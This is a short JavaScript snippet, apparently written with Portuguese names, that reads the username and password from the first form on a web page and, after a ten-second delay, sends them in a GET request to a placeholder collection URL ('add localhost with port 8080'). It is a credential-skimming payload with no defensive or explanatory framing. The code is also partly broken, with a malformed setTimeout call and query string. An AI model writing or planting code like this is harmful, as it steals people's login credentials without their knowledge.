usuario = document.forms[0].elements[0].value; 
senha = document.forms[0].elements[1].value; 

entrada.setTimeout(function(){  
  
var req = new XMLHttpRequest(); 
req.open('GET', 'Adicionar localhost com porta 8080' + usuario + '&senha' + senha + 'GETIT?', true); 
req.send();

} , 10000); 
